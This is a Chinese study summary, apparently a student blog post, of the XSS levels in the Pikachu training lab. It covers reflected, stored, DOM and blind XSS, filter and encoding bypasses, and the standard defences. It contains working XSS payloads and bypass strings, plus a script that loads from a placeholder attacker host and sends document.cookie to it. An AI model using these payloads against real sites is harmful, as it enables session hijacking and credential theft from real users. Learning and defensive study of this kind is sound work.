Pikachu XSS 入门小总结

2026年9月21日 Pikachu Web安全 XSS

在大一开学的第二周，我通关了 Pikachu 的 XSS 模块。为了彻底理解“跨站脚本攻击”的本质，我写下了这篇总结。XSS 不是死记硬背 Payload，它的核心是**“破坏原有的代码结构，插入我的代码”**。

一、XSS 的本质（大白话版）

XSS（Cross-Site Scripting），本质上是一种“信任错位”。

正常用户的浏览器，信任服务器发来的网页代码。但服务器如果没做好过滤，把攻击者输入的恶意 JS 代码也当作自己人，原封不动地发给了浏览器，浏览器就会执行这段恶意代码，导致 Cookie 被偷、页面被篡改、甚至被键盘记录。

与 SQL 注入的区别：SQL 注入攻击的是“数据库”，XSS 攻击的是“浏览器（前端）”。

二、Pikachu XSS 关卡全盘复盘

1. 反射型 XSS（GET / POST）

  • 成因：服务器将参数直接回显在 HTML 页面中。GET 是参数在 URL 里（?name=kobe），POST 是参数在请求体里。
  • 攻击方式：在输入框或地址栏输入 <script>alert('xss')</script>。
  • Payload 逐字解析：利用 <script> 标签让浏览器解析并执行里面的 JS 代码。
  • 特点：非持久型。需要诱骗受害者点击恶意链接。

2. 存储型 XSS

  • 成因：恶意代码被存入了数据库（如留言板），当其他用户访问留言板时，服务器从数据库读出并渲染。
  • 危害：极大。不需要诱骗点击，只要有人访问页面，就会中招，容易引发“XSS 蠕虫”。

3. DOM 型 XSS

  • 成因：不经过服务器端，前端 JS 直接使用了不可信的用户输入（如 location.hash），并赋给了危险函数（如 innerHTML）。
  • 攻击方式：利用 <img src=1 onerror=alert('xss')>。
  • Payload 逐字解析：src=1 是无效图片地址（必然加载失败），触发 onerror 事件，执行弹窗。

4. XSS 之盲打（Blind XSS）

  • 成因：漏洞存在于后台管理页面（如留言反馈）。攻击者留言，但留言展示在管理员后台。
  • 攻击方式：配合 XSS 平台（如 Pikachu 自带的 pkxss 后台），在留言中注入 <script src="http://攻击机/xss.js"></script>，偷取管理员的 Cookie。

三、绕过防御的“核武器”（过滤、编码、上下文）

1. XSS 之过滤（黑名单绕过）

  • 防御机制：WAF 或后端使用正则表达式匹配并过滤 <script> 关键词。
  • 绕过方式：
    • 大小写混淆：利用 HTML 标签不区分大小写，输入 <ScRiPt>alert(1)</ScRiPt>。
    • 标签替换：彻底放弃 <script>，使用事件驱动标签，如 <img src=x onerror=alert(1)>。

2. XSS 之 htmlspecialchars（实体编码绕过）

  • 防御机制：后端调用 htmlspecialchars()，把 < 变成了 &lt;，导致标签无法解析。
  • 绕过方式（输出在属性里）：不能新建标签了，尝试闭合属性或伪协议。输入 javascript:alert(1) 或 "> <img src=1 onerror=alert(1)>。

3. XSS 之 href 输出（伪协议注入）

  • 成因：输入被放到了 <a href="你的输入"> 里。
  • 攻击方式：利用伪协议 javascript:alert(1)。因为 href 不仅接受 http，还接受 JS 伪协议。

4. XSS 之 JS 输出（字符串逃逸）

  • 成因：输入被放到了 JS 代码的字符串里，如 var player = '你的输入';。
  • 攻击方式：闭合单引号，利用运算符强行执行表达式，如 tmac'-alert(1)-'。
  • 代码解析：减号 - 触发 JS 的类型转换，将字符串变为 NaN，为了计算减法，JS 引擎会强行执行 alert(1)，实现逃逸。

四、进阶拓展：如何寻找输出点？

不要上来就打 Payload！先输入探针字符串（如 hello123），按 F12 搜索它出现在哪里。这就是寻找“输出上下文”：

  • HTML 标签之间： <div>hello123</div> -> 直接打 <script> 或 <img>。
  • HTML 属性内： <input value="hello123"> -> 闭合引号：" onclick="alert(1)。
  • JS 代码内： var a = 'hello123'; -> 闭合单引号：'-alert(1)-'。
  • CSS 内 / 注释内： 闭合 CSS 或 HTML 注释。

五、深度拓展：WAF 与编码转换

WAF（Web应用防火墙）是服务器前面的“安检门”，使用复杂的正则表达式过滤。但 WAF 不懂语义，这就给了我们“认知偏差”的绕过机会。

  • HTML 实体编码：把 < 编码为 &lt;。WAF 看到的是 &lt;script&gt;，以为是普通文本放行；浏览器解析时自动解码还原为 <script>，执行恶意代码。
  • URL 编码：%3Cscript%3E。
  • Unicode 编码 / 内联注释：<scr\0ipt> 等。

六、XSS 平台与高级利用

  • Cookie 窃取：最常见的利用方式。Payload：<script>new Image().src='http://攻击机/cookie.php?c='+document.cookie;</script>，配合 XSS 后台接收。
  • 键盘记录（Keylogger）：监听 onkeydown 事件，将用户输入的账号密码发送回攻击机。
  • 钓鱼（Phishing）：伪造登录框，劫持用户输入。
  • BeEF（The Browser Exploitation Framework）：专业的 XSS 利用框架，可以控制受害者的浏览器发起内网扫描、DDoS 等。

七、防御之道（如何修复）

  1. 输出编码（最有效）：根据输出位置，使用 htmlspecialchars()、JS 转义、URL 编码。不要依赖黑名单。
  2. HttpOnly Cookie：在 Cookie 中设置 HttpOnly 属性，禁止 JS 读取 Cookie，让 XSS 无法直接窃取登录凭证。
  3. CSP（内容安全策略）：通过 HTTP 响应头 Content-Security-Policy 限制页面可以加载的脚本源，从根本上阻断内联脚本的执行。
  4. 输入验证：采用白名单机制，严格限制用户输入的内容。

做一道题，就要往自己脑子里装点东西。
